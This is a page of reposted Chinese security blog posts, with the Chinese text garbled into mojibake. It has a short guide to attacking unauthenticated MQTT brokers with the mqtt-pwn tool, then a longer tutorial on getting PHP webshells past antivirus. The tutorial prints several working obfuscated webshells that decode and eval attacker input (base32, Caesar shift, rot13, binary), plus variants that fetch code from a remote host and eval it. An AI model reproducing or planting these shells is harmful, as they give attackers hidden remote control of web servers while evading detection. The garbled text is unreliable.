  
    <article class="post ">

    
        <h2 class="title">
            <a href="/2024/01/19/MQTT-Pwd/">
                MQTTæœªæˆæƒæ¼æ´åˆ©ç”¨
            </a>
        </h2>
    
    <time>
        Jan 19, 2024
    </time>
    <section class="content">
        <h1><span id="mqttæœªæˆæƒæ¼æ´åˆ©ç”¨">MQTTæœªæˆæƒæ¼æ´åˆ©ç”¨</span></h1><blockquote>
<p>æœ¬æ–‡è½¬è‡ª<a target="_blank" rel="noopener" href="https://www.cnblogs.com/suyu7/p/15290972.html">å”å°é£</a> å¹¶ä½œè¡¥å……</p>
</blockquote>
<h3><span id="1-æ‰«æç«¯å£">1ã€æ‰«æç«¯å£</span></h3><blockquote>
<p><img src="/2024/01/19/MQTT-Pwd/1.png" alt="image"></p>
</blockquote>
<h3><span id="2-mqtt-pwdå®‰è£…">2ã€mqtt-pwdå®‰è£…</span></h3><blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/akamai-threat-research/mqtt-pwn.git</span><br><span class="line"><span class="built_in">cd</span> mqtt-pwd</span><br><span class="line">docker-compose up --build --detach</span><br><span class="line">docker-compose run cli</span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">discovery</span><br><span class="line">scans</span><br><span class="line">scans -i 1</span><br><span class="line">topics</span><br></pre></td></tr></table></figure>

<p><img src="/2024/01/19/MQTT-Pwd/2.png" alt="image"></p>
</blockquote>


        

        
            <div class="tags">
                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/MQTT/" rel="tag">MQTT</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
            </div>
        

    </section>
</article>
  
    <article class="post ">

    
        <h2 class="title">
            <a href="/2024/01/19/Webshell-Bypass/">
                ä¸€äº›webshellå…æ€çš„æŠ€å·§
            </a>
        </h2>
    
    <time>
        Jan 19, 2024
    </time>
    <section class="content">
        <h1><span id="ä¸€äº›webshellå…æ€çš„æŠ€å·§">ä¸€äº›webshellå…æ€çš„æŠ€å·§</span></h1><blockquote>
<p>æœ¬æ–‡è½¬è‡ª<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9290?time__1311=n4+xuDgD9DyDRD0rxfxDqGNQhavn8P2ne4wD">pureqh</a> å¹¶ä½œè¡¥å……</p>
</blockquote>
<h3><span id="0x00å‰è¨€">0x00ï¼šå‰è¨€</span></h3><blockquote>
<p>ç”±äºæ€è½¯çš„è§„åˆ™åœ¨ä¸æ–­æ›´æ–° æ‰€ä»¥å¾ˆå¤šä¹‹å‰çš„è¿‡æ€è½¯æ–¹æ³•åŸºæœ¬ä¸Šéƒ½ä¸è¡Œäº† è€Œä¸”éšç€php7é€æ¸æ‰©å¼  asserté©¬ä¹Ÿå°†è¢«æ·˜æ±° æ‰€ä»¥æœ¬æ–‡å°†æå‡ºå‡ ç§å…æ€æ€è·¯ æ•ˆæœå¾ˆå¥½ è€Œä¸”ä¸ä¼šè¢«æ€è½¯çš„æ­£åˆ™å’Œæ²™ç›’è§„åˆ™çº¦æŸã€‚</p>
</blockquote>
<h3><span id="0x01è‡ªå®šä¹‰åŠ å¯†bypass">0x01ï¼šè‡ªå®šä¹‰åŠ å¯†Bypass</span></h3><blockquote>
<p>éƒ¨åˆ†æ€è½¯ä¼šç›´æ¥å°†ä¸€äº›ç¼–ç å‡½æ•°å¦‚Base64ã€ç¼–ç åçš„å…³é”®å­—æˆ–ç»„åˆå‡½æ•°åŠ å…¥äº†è§„åˆ™ æ¯”å¦‚æŸdir+</p>
<p><img src="/2024/01/19/Webshell-Bypass/1.png" alt="image"></p>
<p>æ¯”å¦‚è¿™ä¸ª éƒ½èƒ½è¢«æ£€æµ‹å‡ºæ˜¯shell</p>
<p>æ‰€ä»¥ä¸ºäº†é˜²æ­¢è¿™ç§çš„è§„åˆ™ è‡ªå®šä¹‰åŠ å¯†æ˜¾ç„¶æ˜¯æœ€ä¼˜è§£</p>
<p>è‡ªå®šä¹‰åŠ å¯†å¯é€‰æ€§å¤šäº† åªè¦èƒ½æŠŠåŠ å¯†åçš„å­—ç¬¦è¿˜åŸå›å»å°±è¡Œ æ¯”å¦‚base32 base58 è¿™ç±»çš„baseç¼–ç å…¨å®¶æ¡¶ æˆ–è€…è‡ªå®šä¹‰asciiç§»ä½ ç”šè‡³æ˜¯å¯¹ç§°åŠ å¯†ç®—æ³•ç­‰éƒ½æ˜¯å¯ä»¥ç»•è¿‡è¿™ç±»è§„åˆ™æ£€æµ‹</p>
<ul>
<li>base32ç¼–ç payload<br>ï¼ˆ<a target="_blank" rel="noopener" href="https://github.com/pureqh/webshell%EF%BC%89%EF%BC%9A">https://github.com/pureqh/webshellï¼‰ï¼š</a></li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">KUYE</span></span>&#123;</span><br><span class="line">      <span class="keyword">public</span> <span class="variable">$DAXW</span> = <span class="literal">null</span>;</span><br><span class="line">      <span class="keyword">public</span> <span class="variable">$LRXV</span> = <span class="literal">null</span>;</span><br><span class="line">      <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;DAXW = <span class="string">&#x27;mv3gc3bierpvat2tkrnxuzlsn5ossoy&#x27;</span>;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;LRXV = @<span class="title function_ invoke__">SYXJ</span>(<span class="variable">$this</span>-&gt;DAXW);</span><br><span class="line">      @<span class="keyword">eval</span>(<span class="string">&quot;/*GnSpe=u*/&quot;</span>.<span class="variable language_">$this</span>-&gt;LRXV.<span class="string">&quot;/*GnSpe=u*/&quot;</span>);</span><br><span class="line">      &#125;&#125;</span><br><span class="line"><span class="keyword">new</span> <span class="title function_ invoke__">KUYE</span>();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">MNWK</span>(<span class="params"><span class="variable">$QSFX</span></span>)</span>&#123;</span><br><span class="line">  <span class="variable">$BASE32_ALPHABET</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz234567&#x27;</span>;</span><br><span class="line">  <span class="variable">$NLHB</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="variable">$v</span> = <span class="number">0</span>;</span><br><span class="line">  <span class="variable">$vbits</span> = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>, <span class="variable">$j</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$QSFX</span>); <span class="variable">$i</span> &lt; <span class="variable">$j</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">  <span class="variable">$v</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">      <span class="variable">$v</span> += <span class="title function_ invoke__">ord</span>(<span class="variable">$QSFX</span>[<span class="variable">$i</span>]);</span><br><span class="line">      <span class="variable">$vbits</span> += <span class="number">8</span>;</span><br><span class="line">      <span class="keyword">while</span> (<span class="variable">$vbits</span> &gt;= <span class="number">5</span>) &#123;</span><br><span class="line">          <span class="variable">$vbits</span> -= <span class="number">5</span>;</span><br><span class="line">          <span class="variable">$NLHB</span> .= <span class="variable">$BASE32_ALPHABET</span>[<span class="variable">$v</span> &gt;&gt; <span class="variable">$vbits</span>];</span><br><span class="line">          <span class="variable">$v</span> &amp;= ((<span class="number">1</span> &lt;&lt; <span class="variable">$vbits</span>) - <span class="number">1</span>);&#125;&#125;</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$vbits</span> &gt; <span class="number">0</span>)&#123;</span><br><span class="line">      <span class="variable">$v</span> &lt;&lt;= (<span class="number">5</span> - <span class="variable">$vbits</span>);</span><br><span class="line">      <span class="variable">$NLHB</span> .= <span class="variable">$BASE32_ALPHABET</span>[<span class="variable">$v</span>];&#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$NLHB</span>;&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SYXJ</span>(<span class="params"><span class="variable">$QSFX</span></span>)</span>&#123;</span><br><span class="line">  <span class="variable">$NLHB</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="variable">$v</span> = <span class="number">0</span>;</span><br><span class="line">  <span class="variable">$vbits</span> = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>, <span class="variable">$j</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$QSFX</span>); <span class="variable">$i</span> &lt; <span class="variable">$j</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">      <span class="variable">$v</span> &lt;&lt;= <span class="number">5</span>;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$QSFX</span>[<span class="variable">$i</span>] &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; <span class="variable">$QSFX</span>[<span class="variable">$i</span>] &lt;= <span class="string">&#x27;z&#x27;</span>)&#123;</span><br><span class="line">          <span class="variable">$v</span> += (<span class="title function_ invoke__">ord</span>(<span class="variable">$QSFX</span>[<span class="variable">$i</span>]) - <span class="number">97</span>);</span><br><span class="line">      &#125; <span class="keyword">elseif</span> (<span class="variable">$QSFX</span>[<span class="variable">$i</span>] &gt;= <span class="string">&#x27;2&#x27;</span> &amp;&amp; <span class="variable">$QSFX</span>[<span class="variable">$i</span>] &lt;= <span class="string">&#x27;7&#x27;</span>) &#123;</span><br><span class="line">          <span class="variable">$v</span> += (<span class="number">24</span> + <span class="variable">$QSFX</span>[<span class="variable">$i</span>]);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="variable">$vbits</span> += <span class="number">5</span>;</span><br><span class="line">      <span class="keyword">while</span> (<span class="variable">$vbits</span> &gt;= <span class="number">8</span>)&#123;</span><br><span class="line">          <span class="variable">$vbits</span> -= <span class="number">8</span>;</span><br><span class="line">          <span class="variable">$NLHB</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$v</span> &gt;&gt; <span class="variable">$vbits</span>);</span><br><span class="line">          <span class="variable">$v</span> &amp;= ((<span class="number">1</span> &lt;&lt; <span class="variable">$vbits</span>) - <span class="number">1</span>);&#125;&#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$NLHB</span>;&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2024/01/19/Webshell-Bypass/2.png" alt="image"></p>
<ul>
<li>asciiç ç§»ä½payloadï¼ˆå‡¯æ’’åŠ å¯†ï¼‰</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FKPC</span></span>&#123;</span><br><span class="line">      <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;TQYV = <span class="string">&quot;bs^i%!\MLPQXwbolZ&amp;8&quot;</span>;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;WZDM = @<span class="title function_ invoke__">HHGJ</span>(<span class="variable">$this</span>-&gt;TQYV);</span><br><span class="line">      @<span class="keyword">eval</span>(<span class="string">&quot;/*#jkskjwjqo*/&quot;</span>.<span class="variable language_">$this</span>-&gt;WZDM.<span class="string">&quot;/*sj#ahajsj*/&quot;</span>);</span><br><span class="line">      &#125;&#125;</span><br><span class="line"><span class="keyword">new</span> <span class="title function_ invoke__">FKPC</span>();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">HHGJ</span>(<span class="params"><span class="variable">$UyGv</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$svfe</span> = [];</span><br><span class="line"><span class="variable">$mxAS</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$f</span> = <span class="variable">$UyGv</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$f</span>);<span class="variable">$i</span>++)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="variable">$svfe</span>[] = <span class="title function_ invoke__">chr</span>((<span class="title function_ invoke__">ord</span>(<span class="variable">$f</span>[<span class="variable">$i</span>])+<span class="number">3</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$mxAS</span> = <span class="title function_ invoke__">implode</span>(<span class="variable">$svfe</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$mxAS</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2024/01/19/Webshell-Bypass/3.png" alt="image"></p>
<p>å±…ç„¶æ²¡è¿‡webdir+</p>
<p>é‚£å¦‚ä½•è§£å†³å‘¢ æˆ‘ä»¬åé¢å†è¯´ å½“ç„¶åº”ä»˜Dç›¾è¿˜æ˜¯ç»°ç»°æœ‰ä½™äº†</p>
<p><img src="/2024/01/19/Webshell-Bypass/4.png" alt="image"></p>
<p>Rot13åŠ å¯†payload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">KUYE</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$DAXW</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$LRXV</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;DAXW = <span class="string">&#x27;riny($_CBFG[mreb]);&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;LRXV = @<span class="title function_ invoke__">str_rot13</span>(<span class="variable">$this</span>-&gt;DAXW);</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="string">&quot;/*GnSpe=u*/&quot;</span>.<span class="variable language_">$this</span>-&gt;LRXV.<span class="string">&quot;/*GnSpe=u*/&quot;</span>);</span><br><span class="line">        &#125;&#125;</span><br><span class="line"><span class="keyword">new</span> <span class="title function_ invoke__">KUYE</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>äºŒè¿›åˆ¶è½¬åŒ–payload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">KUYE</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$DAXW</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$LRXV</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;DAXW = <span class="string">&#x27;1100101 1110110 1100001 1101100 101000 100100 1011111 1010000 1001111 1010011 1010100 1011011 1111010 1100101 1110010 1101111 1011101 101001 111011&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;LRXV = @<span class="title function_ invoke__">BinToStr</span>(<span class="variable">$this</span>-&gt;DAXW);</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="string">&quot;/*GnSpe=u*/&quot;</span>.<span class="variable language_">$this</span>-&gt;LRXV.<span class="string">&quot;/*GnSpe=u*/&quot;</span>);</span><br><span class="line">        &#125;&#125;</span><br><span class="line"><span class="keyword">new</span> <span class="title function_ invoke__">KUYE</span>();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">BinToStr</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$arr</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27; &#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$arr</span> <span class="keyword">as</span> &amp;<span class="variable">$v</span>)&#123;</span><br><span class="line">        <span class="variable">$v</span> = <span class="title function_ invoke__">pack</span>(<span class="string">&quot;H&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">base_convert</span>(<span class="variable">$v</span>, <span class="number">2</span>, <span class="number">16</span>)), <span class="title function_ invoke__">base_convert</span>(<span class="variable">$v</span>, <span class="number">2</span>, <span class="number">16</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">join</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable">$arr</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2024/01/19/Webshell-Bypass/5.png" alt="image"></p>
<p>è¿™é‡Œå°±ä¸åˆ—ä¸¾äº† åªè¦æ–¹æ³•æ­£ç¡® ç»•è¿‡æ€è½¯æ˜¯å¾ˆç®€å•çš„</p>
</blockquote>
<h3><span id="0x02é€šè¿‡httpè·å¾—å…³é”®å‚æ•°">0x02ï¼šé€šè¿‡httpè·å¾—å…³é”®å‚æ•°</span></h3><blockquote>
<p>ä¸Šé¢é‚£ä¸ªå‡¯æ’’å¯†ç ä¸æ˜¯è¢«webdir+æ€äº†å— æˆ‘ä»¬åœ¨è¿™é‡Œå°†ä»–ç»•è¿‡</p>
<p>ä¼—æ‰€å‘¨çŸ¥å‡¯æ’’å¯†ç éœ€è¦è®¾ç½®å¾€å‰æˆ–å¾€åç§»å‡ ä½ascii è¿™ä¸ªå‚æ•°å¯ä»¥è®¾ç½®ä¸ºè§£å¯†æ–¹æ³•çš„è¾“å…¥å‚æ•° ç»è¿‡æµ‹è¯• æ­¤å‚æ•°åœ¨æºç ä¸­ä¼šè¢«æ²™ç›’è·‘å‡ºäº† å› æ­¤ä¸èƒ½è¿‡ç™¾åº¦æ€æ¯’ ï¼Œé‚£ä¹ˆ æˆ‘ä¸å†™æœ¬åœ°ä¸å°±è¡Œäº† æˆ‘ç›´æ¥èµ·ä¸€ä¸ªhttpæœåŠ¡è®¿é—®æ–‡æœ¬è·å¾—å‚æ•°å€¼ã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FKPC</span></span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$url</span> = <span class="string">&quot;http://xxxxx:8080/1.txt&quot;</span>;</span><br><span class="line">        <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$url</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">        <span class="title function_ invoke__">stream_get_meta_data</span>(<span class="variable">$fp</span>);</span><br><span class="line">        <span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123;</span><br><span class="line">            <span class="variable">$body</span>.= <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>, <span class="number">1024</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;x = <span class="variable">$body</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;TQYV = <span class="string">&quot;bs^i%!\MLPQXwbolZ&amp;8&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;WZDM = @<span class="title function_ invoke__">HHGJ</span>(<span class="variable">$this</span>-&gt;TQYV,<span class="variable">$this</span>-&gt;x);</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="string">&quot;/*#jkskjwjqo*/&quot;</span>.<span class="variable language_">$this</span>-&gt;WZDM.<span class="string">&quot;/*sj#ahajsj*/&quot;</span>);</span><br><span class="line">        &#125;&#125;</span><br><span class="line"><span class="keyword">new</span> <span class="title function_ invoke__">FKPC</span>();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">HHGJ</span>(<span class="params"><span class="variable">$UyGv</span>,<span class="variable">$x</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$svfe</span> = [];</span><br><span class="line"><span class="variable">$mxAS</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$f</span> = <span class="variable">$UyGv</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$f</span>);<span class="variable">$i</span>++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$svfe</span>[] = <span class="title function_ invoke__">chr</span>((<span class="title function_ invoke__">ord</span>(<span class="variable">$f</span>[<span class="variable">$i</span>])+<span class="variable">$x</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$mxAS</span> = <span class="title function_ invoke__">implode</span>(<span class="variable">$svfe</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$mxAS</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2024/01/19/Webshell-Bypass/6.png" alt="image"></p>
<p>å½“ç„¶è‚¯å®šèƒ½ç”¨</p>
<p><img src="/2024/01/19/Webshell-Bypass/7.png" alt="image"></p>
<p>ä½†æ˜¯ è¿™è½¬äº†ä¸€åœˆç®€ç›´ä¸ä½ç¢³å•Š æˆ‘ä¸èƒ½ç›´æ¥httpè·å–payloadå— â€¦</p>
<p>ç®€åŒ–ä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">KUYE</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&#x27;yshasaui&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$b</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$url</span> = <span class="string">&quot;http://xxx/1.txt&quot;</span>;</span><br><span class="line">        <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$url</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">        <span class="title function_ invoke__">stream_get_meta_data</span>(<span class="variable">$fp</span>);</span><br><span class="line">        <span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123;</span><br><span class="line">            <span class="variable">$body</span>.= <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>, <span class="number">1024</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="variable">$body</span>;</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="string">&quot;/*GnSpe=121u*/&quot;</span>.<span class="variable language_">$this</span>-&gt;b.<span class="string">&quot;/*Gn212Spe=u*/&quot;</span>);</span><br><span class="line">        &#125;&#125;</span><br><span class="line"><span class="keyword">new</span> <span class="title function_ invoke__">KUYE</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2024/01/19/Webshell-Bypass/8.png" alt="image"></p>
<p><img src="/2024/01/19/Webshell-Bypass/9.png" alt="image"></p>
</blockquote>
<h3><span id="0x03é‡å†™å‡½æ•°bypass">0x03ï¼šé‡å†™å‡½æ•°Bypass</span></h3><blockquote>
<p>ä¼—æ‰€å‘¨çŸ¥ æ­£åˆ™ç±»æ€è½¯æœ€å–œæ¬¢ç›´æ¥æŠŠå±é™©å‡½æ•°åŠ å…¥è§„åˆ™ é‚£ä¹ˆ å®ƒæ€çš„æ˜¯å‡½æ•°å è¿˜æ˜¯é€»è¾‘å‘¢ï¼Ÿ</p>
<p>è¯•ä¸€è¯•å°±çŸ¥é“äº†</p>
<p>æˆ‘ä»¬çš„æ ·æœ¬å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">substr</span>(<span class="string">&quot;assertxx&quot;</span>,<span class="number">0</span>,<span class="number">6</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿™æ˜¯ä¸ªä½¿ç”¨substrå‡½æ•°åˆ‡å‰²å…³é”®å­—çš„å°é©¬</p>
<p>ç›´æ¥æ‰”åˆ°webdir+æ€</p>
<p><img src="/2024/01/19/Webshell-Bypass/10.png" alt="image"></p>
<p>æ¯«æ— ç–‘é—®çš„è¢«æ€äº†</p>
<p>é‚£ä¹ˆ æˆ‘ä»¬é‡å†™substrå‡½æ•°</p>
